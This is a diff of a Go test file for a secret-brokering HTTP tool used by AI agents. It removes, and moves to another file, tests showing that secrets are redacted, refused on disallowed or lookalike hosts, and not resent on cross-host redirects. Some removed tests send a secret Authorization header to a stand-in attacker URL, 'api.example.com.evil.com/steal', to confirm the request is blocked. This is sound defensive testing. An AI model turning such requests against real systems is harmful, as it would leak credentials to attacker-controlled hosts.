@@ -10,7 +10,6 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
-	"sync/atomic"
 	"testing"
 
 	"loadout.dev/loadout/internal/mcp"
@@ -122,185 +121,12 @@ func TestHTTPRequestSubstitutesSecretIntoAllowedHost(t *testing.T) {
 	}
 }
 
-// TestHTTPRequestScrubsSecretReflectedInResponse proves the second
-// half of INVARIANT 10's extension: an allow-listed host is trusted
-// with the secret, but if it reflects the value back — an echoed
-// header, an error body quoting it — the tool result must never hand
-// that value to the agent. Every exact occurrence is replaced with
-// "[redacted-by-loadout]" instead.
-func TestHTTPRequestScrubsSecretReflectedInResponse(t *testing.T) {
-	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		w.Header().Set("X-Echoed-Auth", r.Header.Get("Authorization"))
-		w.WriteHeader(http.StatusOK)
-		w.Write([]byte(`{"error":"bad credential: ` + r.Header.Get("Authorization") + `"}`))
-	}))
-	defer server.Close()
-
-	v := newBrokerVault(t, []string{hostOf(t, server.URL)})
-	args := toJSON(t, brokerArgs{
-		Method:  "GET",
-		URL:     server.URL,
-		Headers: map[string]string{"Authorization": "Bearer {{secret:api-key}}"},
-	})
-	text, isError := callTool(t, v, "http_request", args)
-	if isError {
-		t.Fatalf("http_request returned isError true: %s", text)
-	}
-	if strings.Contains(text, brokerDummyValue) {
-		t.Fatalf("the tool result must never hand the reflected dummy value back to the agent: %s", text)
-	}
-	if !strings.Contains(text, "[redacted-by-loadout]") {
-		t.Fatalf("the tool result must show the redaction placeholder in place of the reflected value, got: %s", text)
-	}
-	// Both the reflected header AND the reflected body occurrence must
-	// be scrubbed — not just one of the two.
-	if strings.Count(text, "[redacted-by-loadout]") < 2 {
-		t.Fatalf("want the placeholder in both the echoed header and the echoed body, got: %s", text)
-	}
-}
-
-// TestHTTPRequestEmptyAllowedHostsRefused proves the fail-closed
-// default: a secret with no allowed_hosts is refused before anything
-// is decrypted or sent — the outbound server never even sees a
-// connection.
-func TestHTTPRequestEmptyAllowedHostsRefused(t *testing.T) {
-	var hits int32
-	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		atomic.AddInt32(&hits, 1)
-	}))
-	defer server.Close()
-
-	v := newBrokerVault(t, nil)
-	args := toJSON(t, brokerArgs{
-		Method:  "GET",
-		URL:     server.URL,
-		Headers: map[string]string{"Authorization": "Bearer {{secret:api-key}}"},
-	})
-	text, isError := callTool(t, v, "http_request", args)
-	if !isError {
-		t.Fatalf("want isError true for an empty allowed_hosts, got text %q", text)
-	}
-	if atomic.LoadInt32(&hits) != 0 {
-		t.Fatal("the outbound server must never receive a request when allowed_hosts is empty")
-	}
-	if strings.Contains(text, brokerDummyValue) {
-		t.Fatalf("the refusal leaked the dummy value: %q", text)
-	}
-}
-
-// TestHTTPRequestWrongHostRefused proves a request to a host NOT in
-// allowed_hosts is refused, and the value is never sent.
-func TestHTTPRequestWrongHostRefused(t *testing.T) {
-	var hits int32
-	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		atomic.AddInt32(&hits, 1)
-	}))
-	defer server.Close()
-
-	v := newBrokerVault(t, []string{"some-other-host.example:9"})
-	args := toJSON(t, brokerArgs{
-		Method:  "GET",
-		URL:     server.URL,
-		Headers: map[string]string{"Authorization": "Bearer {{secret:api-key}}"},
-	})
-	text, isError := callTool(t, v, "http_request", args)
-	if !isError {
-		t.Fatalf("want isError true for a disallowed host, got text %q", text)
-	}
-	if atomic.LoadInt32(&hits) != 0 {
-		t.Fatal("the outbound server must never receive a request to a disallowed host")
-	}
-	if strings.Contains(text, brokerDummyValue) {
-		t.Fatalf("the refusal leaked the dummy value: %q", text)
-	}
-}
-
-// TestHTTPRequestExactHostMatchNotSubstring proves allowed_hosts
-// matching is exact: "api.example.com" must never match
-// "api.example.com.evil.com". No real server is needed: the check
-// runs on the parsed host string alone, before any connection is
-// attempted.
-func TestHTTPRequestExactHostMatchNotSubstring(t *testing.T) {
-	v := newBrokerVault(t, []string{"api.example.com"})
-	args := toJSON(t, brokerArgs{
-		Method:  "GET",
-		URL:     "http://api.example.com.evil.com/steal",
-		Headers: map[string]string{"Authorization": "Bearer {{secret:api-key}}"},
-	})
-	text, isError := callTool(t, v, "http_request", args)
-	if !isError {
-		t.Fatalf("want isError true: a suffix match must never be treated as allowed, got text %q", text)
-	}
-	if strings.Contains(text, brokerDummyValue) {
-		t.Fatalf("the refusal leaked the dummy value: %q", text)
-	}
-}
-
-// TestHTTPRequestSecretInURLRefused proves a {{secret:...}} reference
-// anywhere in the url is refused before any decrypt, even one shaped
-// to look like part of the hostname, and writes no access-log entry.
-func TestHTTPRequestSecretInURLRefused(t *testing.T) {
-	v := newBrokerVault(t, []string{"example.com"})
-	args := toJSON(t, brokerArgs{
-		Method: "GET",
-		URL:    "http://{{secret:api-key}}.example.com/",
-	})
-	text, isError := callTool(t, v, "http_request", args)
-	if !isError {
-		t.Fatalf("want isError true for a secret placeholder in the url, got text %q", text)
-	}
-	if !strings.Contains(text, "must not contain") {
-		t.Fatalf("bad refusal message: %q", text)
-	}
-	if strings.Contains(text, brokerDummyValue) {
-		t.Fatalf("the refusal leaked the dummy value: %q", text)
-	}
-	if strings.Contains(accessLogText(t, v), "broker") {
-		t.Fatal("a refused-before-decrypt call must never write an access-log entry")
-	}
-}
-
-// TestHTTPRequestRedirectDoesNotResendSecretToDifferentHost proves the
-// cross-host redirect refusal: the allowed host receives the secret,
-// but a 302 redirecting to a DIFFERENT host is never followed with
-// the secret attached — the second server sees no request at all.
-func TestHTTPRequestRedirectDoesNotResendSecretToDifferentHost(t *testing.T) {
-	var targetHits int32
-	target := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		atomic.AddInt32(&targetHits, 1)
-	}))
-	defer target.Close()
-
-	var redirectorAuth string
-	redirector := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		redirectorAuth = r.Header.Get("Authorization")
-		http.Redirect(w, r, target.URL+"/steal", http.StatusFound)
-	}))
-	defer redirector.Close()
-
-	v := newBrokerVault(t, []string{hostOf(t, redirector.URL)})
-	args := toJSON(t, brokerArgs{
-		Method:  "GET",
-		URL:     redirector.URL,
-		Headers: map[string]string{"Authorization": "Bearer {{secret:api-key}}"},
-	})
-	text, isError := callTool(t, v, "http_request", args)
-	if isError {
-		t.Fatalf("http_request returned isError true: %s", text)
-	}
-	if redirectorAuth != "Bearer "+brokerDummyValue {
-		t.Fatalf("the allowed host must receive the substituted value, got Authorization = %q", redirectorAuth)
-	}
-	if atomic.LoadInt32(&targetHits) != 0 {
-		t.Fatal("the redirect target (a different host) must never receive a request")
-	}
-	if !strings.Contains(text, `"status":302`) {
-		t.Fatalf("the tool result must report the 3xx status rather than follow it, got: %s", text)
-	}
-	if strings.Contains(text, brokerDummyValue) {
-		t.Fatalf("the tool result leaked the dummy value: %s", text)
-	}
-}
+// The response-reflection scrub, the fail-closed empty-allowed-hosts
+// refusal, the wrong-host refusal, the exact-match (suffix) refusal,
+// the secret-in-url refusal, and the cross-host redirect refusal all
+// moved to broker_adversarial_test.go: they are adversarial vectors,
+// consolidated there as one named, table-driven regression suite. See
+// that file's own doc comment for the full coverage map.
 
 // TestHTTPRequestAccessLogRecordsHostNotValue proves one "broker"
 // access-log entry is written per secret used, naming the secret and
